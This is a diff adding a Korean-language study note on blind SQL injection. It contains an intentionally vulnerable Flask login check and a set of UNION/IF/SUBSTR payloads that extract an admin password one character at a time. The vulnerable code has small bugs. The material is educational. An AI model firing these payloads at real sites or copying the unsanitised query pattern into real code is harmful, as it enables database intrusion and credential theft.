@@ -193,6 +193,72 @@
 <br/>
 
 * Blind SQL Injection: 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
+    - 예시 코드와 데이터베이스
+        ```python
+        from flask import Flask, request # Flask 프레임워크 사용
+        import pymysql # mysql을 DBMS로 사용함
+
+        app = Flask(__name__)
+
+        def getConnection():
+            return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
+
+        @app.route('/', methods=['GET'])
+        def index():
+            username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴
+
+            # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
+            sql = "select username from users where username='%s'" %username
+
+            conn = getConnection()
+            curs = con.cursor(pymysql.cursors.DictCursor)
+            curs.execute(sql)
+            rows = curs.fetchall()
+            conn.close()
+
+            # SQL 실행 결과가 아닌 True/False만을 출력함
+            if (row[0]['username'] == 'admin'): # 데이터베이스의 결과인 username이 "admin"인 경우 이용자에게 "True"가 반환됨
+                return "True"
+            else: # 그렇지 않은 경우 "False"가 반환됨
+                return "False"
+        
+        app.run(host='0.0.0.0', port=8000)
+        ```
+        | username | password |
+        |:---:|------|
+        | admin | Password_for_admin |
+        | guest | guest_Password |
+    - Blind SQL Injection 수행 가능 여부 확인: *```UNION``` 구문을 이용한 ```"admin"``` 반환*
+        + ```index()``` 함수의 ```if...else``` 조건문 부분
+            - 데이터베이스에서 반환된 결과가 ```"admin"```인 경우 이용자에게 ```"True"```가 반환됨
+            - 데이터베이스에서 반환된 결과가 ```"admin"```이 아닌 경우 이용자에게 ```"False"```가 반환됨
+    - Blind SQL Injection 공격 방법: **IF Statements** 및 비교 구문 추가
+        + 이용자가 전달한 username 인자값
+            ```
+            /?username=' UNION SELECT IF(SUBSTR(password, 시작위치, 1)='비교할 알파벳', 'admin', 'not admin') FROM users WHERE username='admin'--
+            ```
+            - ```SUBSTR(string, position, length)``` 함수: 문자열(string)에서 지정한 위치(position)부터 길이(length)까지의 값을 반환하는 함수
+                | SUBSTR 함수의 인자 | 설명 |
+                |:---:|------|
+                | string | Blind SQL Injection 공격을 통해 비밀번호를 획득하는 것이 목적 <br/> &nbsp;&nbsp; → users 데이터베이스의 **password** 부분의 데이터를 가져와 비교해야 함 |
+                | position | password의 첫 번째부터 마지막 길이까지 하나씩 이동해가면서 쿼리를 전송해야 함 <br/> &nbsp;&nbsp; → ```position```의 값은 ```1 ~ (패스워드 길이)``` 범위의 정수값 |
+                | length | 한 글자씩 password의 값을 알아내므로 ```length```의 값은 1로 고정됨 |
+        - 예시: password의 첫 번째 문자를 알아내는 방법
+            ```
+            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='A', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
+            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='B', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
+            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='C', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
+            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='D', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
+
+            ...
+
+            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='P', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ TRUE
+            ```
+            + ***이와 같은 방법으로 position과 비교할 문자를 변경해가며 password 전체를 획득할 수 있음***
+
+<br/>
+
+* Blind SQL Injection 공격 자동화
 
 <br/><br/><br/>
 
